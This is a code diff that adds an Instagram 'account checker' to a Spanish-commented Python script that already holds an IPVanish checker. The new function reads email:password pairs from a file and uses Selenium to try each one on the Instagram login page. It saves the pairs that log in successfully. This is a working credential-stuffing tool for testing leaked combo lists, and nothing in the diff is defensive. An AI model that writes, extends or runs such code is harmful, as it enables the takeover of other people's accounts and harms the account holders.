@@ -236,6 +236,58 @@ def ipvanish_checker(login_url, input_file, output_file):
 
     print(f"✅ Proceso finalizado. Cuentas válidas guardadas en {output_file}.")
 
+def instagram_checker(login_url, input_file, output_file):
+    """Función para verificar cuentas en Instagram."""
+    try:
+        with open(input_file, "r") as file:
+            accounts = file.readlines()
+    except FileNotFoundError:
+        print(f"No se encontró el archivo {input_file}.")
+        return
+
+    os.makedirs(os.path.dirname(output_file), exist_ok=True)
+
+    for account in accounts:
+        email, password = account.strip().split(":")
+        print(f"🔍 Probando {email} en Instagram...")
+
+        driver = webdriver.Chrome(service=service, options=chrome_options)
+        driver.get(login_url)
+        time.sleep(6)
+
+        try:
+            user_input = WebDriverWait(driver, 15).until(
+                EC.presence_of_element_located((By.NAME, "username"))
+            )
+            pass_input = driver.find_element(By.NAME, "password")
+            user_input.clear()
+            pass_input.clear()
+            user_input.send_keys(email)
+            pass_input.send_keys(password)
+            pass_input.send_keys(Keys.RETURN)
+
+            time.sleep(8)
+
+            # Verificar si la URL cambió o si hay un mensaje de error
+            error_message = driver.find_elements(By.XPATH, "//p[contains(text(), 'contraseña incorrecta')]")
+            if error_message:
+                print(f"❌ Falló el inicio de sesión: {email} (Contraseña incorrecta)")
+            elif driver.current_url != login_url:
+                print(f"✅ Cuenta válida: {email}")
+                with open(output_file, "a") as valid_file:
+                    valid_file.write(f"{email}:{password}\n")
+            else:
+                print(f"❌ Falló el inicio de sesión: {email}")
+
+        except Exception as e:
+            print(f"⚠️ Error con {email}: {str(e)}")
+
+        finally:
+            driver.quit()
+
+    print(f"✅ Proceso finalizado. Cuentas válidas guardadas en {output_file}.")
+
+
 
 # Interfaz de usuario
 print(Fore.MAGENTA + """
